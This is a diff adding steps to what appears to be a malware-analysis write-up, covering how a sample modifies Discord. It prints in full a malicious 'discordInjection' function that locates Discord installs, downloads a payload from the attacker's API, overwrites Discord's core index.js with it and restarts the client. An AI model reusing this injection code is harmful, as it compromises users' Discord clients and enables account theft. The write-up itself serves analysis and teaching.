@@ -302,7 +302,82 @@ npm install sqlite3
 
 ![image](https://github.com/user-attachments/assets/54ed6588-8c39-422f-b6d8-466d6ba9fdc3)
 
-50. To identify what discord module has been modified by the malware, we can review the 
+50. To identify what Discord module has been modified by the malware, we need to review all functions related to Discord.
+51. Referring to the **OUTLINE** section, we can identify several functions related to Discord, those are:
+
+```
+1. discordInjection.
+2. newInjection.
+```
+
+> discordInjection()
+
+```js
+async function discordInjection() {
+    const infectedDiscords = [];
+
+    [join(process.env.LOCALAPPDATA, 'Discord'), join(process.env.LOCALAPPDATA, 'DiscordCanary'), join(process.env.LOCALAPPDATA, 'DiscordPTB')]
+    ?.forEach(async(dir) => {
+        if(existsSync(dir)) {
+            if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
+            const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');
+            const discord_index = execSync('where /r . index.js', { cwd: path })?.toString()?.trim();
+            
+            if(discord_index) infectedDiscords?.push(
+                dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')
+            );
+
+            const request = await fetch(options.api + 'injections', {
+                method: 'GET',
+                headers: {
+                    duvet_user: options?.user_id,
+                    logout_discord: options?.logout_discord
+                }
+            });
+
+            const data = await request.json();
+
+            writeFileSync(discord_index, data?.discord, {
+                flag: 'w'
+            });
+
+            await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
+            exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
+                if(err) {};
+            });
+        };
+    });
+
+    return infectedDiscords;
+};
+```
+
+52. Based on the script above, at the beginning it loops through each standard installation directories for Discord (Discorc, Discord Canary, and Discord PTB).
+53. Later on, it checks for existing installations, locates the `index.js` file in Discord's core module directory, then fetches a payload from a specified API to overwrite the file (injecting malicious code).
+
+```js
+const request = await fetch(options.api + 'injections', {
+    method: 'GET',
+    headers: {
+        duvet_user: options?.user_id,
+        logout_discord: options?.logout_discord
+    }
+});
+const data = await request.json();
+```
+
+55. After modifying the file, the script forcibly terminates running Discord processes and restarts them using Discord's **Update.exe**  to ensure the injected code is loaded.
+
+```js
+writeFileSync(discord_index, data?.discord, {
+                flag: 'w'
+            });
+
+            await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
+            exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
+                if(err) {};
+            });
+```
 
 ## IMPORTANT LINK(S):
 
